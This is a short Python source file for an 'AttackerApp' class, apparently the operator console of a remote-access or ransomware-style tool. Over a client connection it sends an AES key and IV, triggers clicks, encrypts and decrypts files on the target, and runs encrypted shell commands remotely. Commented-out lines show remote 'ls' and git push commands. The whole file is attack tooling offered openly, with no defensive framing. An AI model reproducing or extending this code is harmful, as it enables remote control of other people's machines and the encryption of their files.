from lib.client import DefaultClient
from lib.encryption.aes import AESCipher
import time

class AttackerApp:
  def __init__(self, cli: DefaultClient) -> None:
    self.cli = cli
    self.cipher = AESCipher()
    self.cli.connect()
    iv = str(self.cipher.iv.hex())
    self.cli.emit_data('save_iv', iv)
    time.sleep(1)
    key = str(self.cipher.key.hex())
    self.cli.emit_data('save_key', key)
    time.sleep(1)

  def do_click(self):
    self.cli.emit_data("click", '0')
    pass


  def decrypt_file(self, file_path):
    self.cli.emit_data('decrypt_file', file_path)

  def encrypt_file(self, file_path):
    self.cli.emit_data('encrypt_file', file_path)

  def exec(self, command):
    cmd = self.cipher.encrypt(command)
    self.cli.emit_data('exec', cmd)
    
  
  def exit(self):
    self.cli.emit_data('exit', '0')
    self.cli.close()
    exit(0)


if __name__ == '__main__':
  app = AttackerApp(DefaultClient())
  print('Doing click in 3 seconds')
  time.sleep(3)
  app.do_click()
  # time.sleep(5)
  # app.encrypt_file('./test.txt')
  app.decrypt_file('./test.txt')
  time.sleep(5)
  # app.exec('ls')
  # app.exec('git add . && git commit -m "chore: done" && git push')
  app.exit()
